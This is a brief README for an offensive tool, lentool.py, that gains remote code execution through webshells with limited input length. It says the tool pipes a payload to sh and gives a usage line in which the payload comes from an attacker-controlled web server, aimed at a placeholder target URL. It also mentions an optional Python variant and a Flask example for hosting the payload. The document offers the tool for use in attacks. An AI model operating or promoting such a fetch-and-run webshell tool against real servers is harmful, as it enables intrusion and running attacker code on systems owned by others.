# Description
Tool to RCE in limited input length webshells.  
It pipes the payload to sh, you can customize it with a few changes in the source code (python is already done, just uncomment it), also you could modify it to execute commands directly.

# Usage:
```
python3 lentool.py -t http://targetexample.com/?start -u http://myserverexample.com
--target, -t: Target URL with param.  
--url, -u: Web server hosting the payload.
```
In the extras folder you can find an example using flask to host the payload.
